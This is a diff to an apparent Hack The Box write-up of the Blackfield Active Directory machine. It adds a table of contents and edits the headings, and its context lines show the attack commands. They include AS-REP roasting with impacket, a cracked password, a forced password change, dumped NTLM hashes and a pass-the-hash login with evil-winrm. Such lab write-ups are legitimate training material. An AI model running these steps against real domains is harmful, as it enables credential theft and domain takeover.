@@ -6,6 +6,19 @@ date:   2024-11-03 07:00:00 +0300
 image:  '/images/htb_blackfield.png'
 tags:   [Write-ups, HTB, OSCP+, Windows, Hard, Active-Directory]
 ---
+# Table of Contents
+- [Enumeration](#enumeration)
+  - [Nmap](#nmap)
+  - [SMB Null Session access allowed to find a List of Users](#smb-null-session-access-allowed-to-find-a-list-of-users)
+- [Foothold](#foothold)
+  - [AS-REP Roasting on the support user](#as-rep-roasting-on-the-support-user)
+  - [BloodHound Enumeration to find out that user support has ForceChangePassword over user audit2020](#bloodhound-enumeration-to-find-out-that-user-support-has-forcechangepassword-over-user-audit2020)
+  - [Changing the Password of the user audit2020 using rpcclient](#changing-the-password-of-the-user-audit2020-using-rpcclient)
+  - [Accessing SMB Share forensic using the user audit2020](#accessing-smb-share-forensic-using-the-user-audit2020)
+- [Privilege Escalation](#privilege-escalation)
+  - [Abusing SeBackupPrivilege as svc_backup to Dump SAM](#abusing-sebackupprivilege-as-svc_backup-to-dump-sam)
+  - [Abusing SeBackupPrivilege as svc_backup to NTDS.DIT with diskshadow.exe](#abusing-sebackupprivilege-as-svc_backup-to-ntdsdit-with-diskshadowexe)
+  - [Pass-the-Hash to get Administrator access using Evil-WinRM](#pass-the-hash-to-get-administrator-access-using-evil-winrm)
 
 # Enumeration
 ## Nmap
@@ -139,7 +152,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 This is great, we got 3 valid users and the user support has PreAuth (Pre-authentication) disabled. This means we can do an AS-REP Roast attack on the support account!
 
 # Foothold
-## AS-REP Roasting on the "support" user
+## AS-REP Roasting on the support user
 We will use impacket-GetNPUsers to do an AS-REP Roasting attack on the user support:
 ```shell
 impacket-GetNPUsers blackfield.local/support -dc-ip 10.129.191.43 -no-pass
@@ -157,7 +170,7 @@ After waiting patiently for a few seconds, we successfully cracked the hash and 
 ```shell
 support:#00^BlackKnight
 ```
-## BloodHound Enumeration to find out that user "support" has ForceChangePassword over user "audit2020"
+## BloodHound Enumeration to find out that user support has ForceChangePassword over user audit2020
 We tried to get access using impacket-psexec and evil-winrm, and we also checked for password reuse on the other users but got no luck.
 
 It's time to enumerate the domain further and see if the user support has any interesting rights.
@@ -215,7 +228,7 @@ SMB         10.129.191.43   445    DC01             [+] BLACKFIELD.local\audit20
 
 We can see on the results that the new credentials are indeed valid.
 
-## Accessing SMB Share "forensic" using the user "audit2020"
+## Accessing SMB Share forensic using the user audit2020
 With the new credentials we can proceed to enumerate the user audit2020. Evil-WinRM didn't work but we can see that the user audit2020 has read access to the SMB Share forensic:
 ```shell
 nxc smb 10.129.191.43 -u audit2020 -p Password123 --shares
@@ -516,7 +529,7 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b9
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d5b8632baf4c8d87b07a17e0ea6390a0:::
 ```
-
+## Pass-the-Hash to get Administrator access using Evil-WinRM
 We will use evil-winrm to pass-the-hash and get access as Administrator:
 ```shell
 evil-winrm -i 10.129.191.43 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
